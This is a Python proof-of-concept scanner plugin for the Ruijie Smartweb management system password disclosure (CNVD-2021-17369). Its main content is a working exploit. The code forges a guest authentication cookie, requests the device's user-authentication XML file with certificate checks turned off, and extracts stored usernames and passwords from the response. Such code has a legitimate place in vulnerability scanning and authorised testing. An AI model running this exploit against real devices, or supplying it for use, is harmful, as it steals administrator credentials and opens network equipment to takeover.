#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '锐捷Smartweb管理系统 密码信息泄露 CNVD-2021-17369',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Cookie':'login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.21; type=WS3302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest'
      }
  target = '/web/xml/webuser-auth.xml'
  url1 = url + target
  ret['url'] = url1

  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and  re.search(r'<name>.*?</name>.*?<password>.*?</password>.*?<favorites>.*?</favorites>',res.text,re.S):
      name = re.search(r'<name>.*?</name>',res.text,re.S)
      password = re.search(r'<password>.*?</password>',res.text,re.S)
      ret['ifbug'] = True
      ret['huixian'] = 'name:'+name[0]+'\n'+'password:'+password[0]
      res.close()
      return ret
    else:
      return ret
  except:
    return ret